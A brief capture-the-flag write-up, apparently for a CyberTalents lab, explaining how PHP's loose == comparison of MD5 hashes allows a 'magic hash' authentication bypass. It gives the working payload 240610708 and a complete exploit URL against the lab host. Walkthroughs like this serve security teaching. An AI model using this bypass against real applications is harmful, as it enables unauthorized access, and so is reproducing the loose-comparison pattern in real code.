The application checks the MD5 hash of the `passwd` parameter using a loose comparison:

```php id="r7x5wp"
if (hash("md5", $_GET['passwd']) == '0e514198421367523082276382979135')
```

The vulnerability exists because PHP uses `==` instead of `===`.

In PHP, strings starting with:

```txt id="x4q8nz"
0e...
```

and followed only by digits are interpreted as scientific notation and converted to numeric `0`.

This allows a *magic hash* bypass.

Using the payload:

```txt id="m6v3jk"
240610708
```

produces:

```txt id="n9r2fa"
md5("240610708") = 0e462097431906509019562988736854
```

PHP evaluates:

```txt id="k5w1cm"
"0e462097431906509019562988736854" == "0e514198421367523082276382979135"
```

as:

```txt id="u2t7pq"
0 == 0
```

which returns `true`.

Final exploit:

```txt id="b8m4xr"
http://cdcamxwl32pue3e6m4nzy586unzkm0wz0wkr5cwzo-web.cybertalentslabs.com/?passwd=240610708
```

This bypasses the authentication check and reveals the flag.

